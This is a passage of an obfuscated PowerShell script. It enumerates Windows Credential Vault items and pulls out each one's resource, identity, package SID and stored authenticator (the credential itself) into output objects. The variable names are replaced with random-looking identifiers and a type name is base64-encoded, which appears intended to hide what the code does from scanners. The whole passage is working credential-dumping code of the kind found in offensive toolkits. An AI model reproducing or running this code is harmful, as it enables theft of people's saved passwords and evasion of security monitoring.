                    ${12854c7cf3554f48b8f7ba7fd8301150} = [Runtime.InteropServices.Marshal]::PtrToStructure(${4d7c47515f0b42e788329f442342706c}, [Type] ${f2d61ec8abbe45409ddbd8773eb71409})
                    ${4d7c47515f0b42e788329f442342706c} = [IntPtr] (${4d7c47515f0b42e788329f442342706c}.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] ${f2d61ec8abbe45409ddbd8773eb71409}))
                    ${90eaee31c17d44e19fbab5b9722ce6b8} = [IntPtr]::Zero
                    if (${bd40dfe484f544f5ac49b71a65f7b35a} -ge 6 -and ${9cad0d1e6b2e48439dde28800f64a4c9} -ge 2)
                    {
                        ${a75abc70368c44fcbb39ce9edca87f7c} = ${208b5b442263465081f8b114a5784fcf}::VaultGetItem(${34c503abdf824ff9bb9e662b1da95cf4},
                                                          [Ref] ${12854c7cf3554f48b8f7ba7fd8301150}.SchemaId,
                                                          ${12854c7cf3554f48b8f7ba7fd8301150}.pResourceElement,
                                                          ${12854c7cf3554f48b8f7ba7fd8301150}.pIdentityElement,
                                                          ${12854c7cf3554f48b8f7ba7fd8301150}.pPackageSid,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] ${90eaee31c17d44e19fbab5b9722ce6b8})
                    }
                    else
                    {
                        ${a75abc70368c44fcbb39ce9edca87f7c} = ${208b5b442263465081f8b114a5784fcf}::VaultGetItem(${34c503abdf824ff9bb9e662b1da95cf4},
                                                          [Ref] ${12854c7cf3554f48b8f7ba7fd8301150}.SchemaId,
                                                          ${12854c7cf3554f48b8f7ba7fd8301150}.pResourceElement,
                                                          ${12854c7cf3554f48b8f7ba7fd8301150}.pIdentityElement,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] ${90eaee31c17d44e19fbab5b9722ce6b8})
                    }
                    ${c0dfec4826e949428ac400c44f17acd3} = $null
                    if (${a75abc70368c44fcbb39ce9edca87f7c} -ne 0)
                    {
                        Write-Error "Error occured retrieving vault item. Error (0x$(${a75abc70368c44fcbb39ce9edca87f7c}.ToString('X8')))"
                        continue
                    }
                    else
                    {
                        ${c0dfec4826e949428ac400c44f17acd3} = [Runtime.InteropServices.Marshal]::PtrToStructure(${90eaee31c17d44e19fbab5b9722ce6b8}, [Type] ${f2d61ec8abbe45409ddbd8773eb71409})
                    }
                    if (${a49e774fea8b4e23905aabb599ed6413}.ContainsKey(${fee04732c23a47ecacf759098477b7c2}))
                    {
                        ${6d6565286bd247ea9ce35ef454c6bff0} = ${a49e774fea8b4e23905aabb599ed6413}[${fee04732c23a47ecacf759098477b7c2}]
                    }
                    else
                    {
                        ${6d6565286bd247ea9ce35ef454c6bff0} = ${fee04732c23a47ecacf759098477b7c2}
                    }
                    if (${c0dfec4826e949428ac400c44f17acd3}.pAuthenticatorElement -ne [IntPtr]::Zero)
                    {
                        ${4d48240fee0e491fb5f033c271c12a21} = Get-VaultElementValue ${c0dfec4826e949428ac400c44f17acd3}.pAuthenticatorElement
                    }
                    else
                    {
                        ${4d48240fee0e491fb5f033c271c12a21} = $null
                    }
                    ${6b0dc8d0b7e84a0d9e3caf46f53a5fcc} = $null
                    if (${12854c7cf3554f48b8f7ba7fd8301150}.pPackageSid -and (${12854c7cf3554f48b8f7ba7fd8301150}.pPackageSid -ne [IntPtr]::Zero))
                    {
                        ${6b0dc8d0b7e84a0d9e3caf46f53a5fcc} = Get-VaultElementValue ${12854c7cf3554f48b8f7ba7fd8301150}.pPackageSid
                    }
                    ${d531d996545645a088706457d3807a34} = @{
                        Vault = ${6d6565286bd247ea9ce35ef454c6bff0}
                        Resource = if (${12854c7cf3554f48b8f7ba7fd8301150}.pResourceElement) { Get-VaultElementValue ${12854c7cf3554f48b8f7ba7fd8301150}.pResourceElement } else { $null }
                        Identity = if (${12854c7cf3554f48b8f7ba7fd8301150}.pIdentityElement) { Get-VaultElementValue ${12854c7cf3554f48b8f7ba7fd8301150}.pIdentityElement } else { $null }
                        PackageSid = ${6b0dc8d0b7e84a0d9e3caf46f53a5fcc}
                        Credential = ${4d48240fee0e491fb5f033c271c12a21}
                        LastModified = [DateTime]::FromFileTimeUtc(${12854c7cf3554f48b8f7ba7fd8301150}.LastModified)
                    }
                    ${ae1e01228c4e47fe9920e3715d774bb4} = New-Object PSObject -Property ${d531d996545645a088706457d3807a34}
                    ${ae1e01228c4e47fe9920e3715d774bb4}.PSObject.TypeNames[0] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBBAFUATABUAEMATABJAC4AVgBBAFUATABUAEkAVABFAE0A')))
                    ${ae1e01228c4e47fe9920e3715d774bb4}
                    $null = ${208b5b442263465081f8b114a5784fcf}::VaultFree(${90eaee31c17d44e19fbab5b9722ce6b8})
                }
            }
            $null = ${208b5b442263465081f8b114a5784fcf}::VaultCloseVault([Ref] ${34c503abdf824ff9bb9e662b1da95cf4})
        }
    }
}
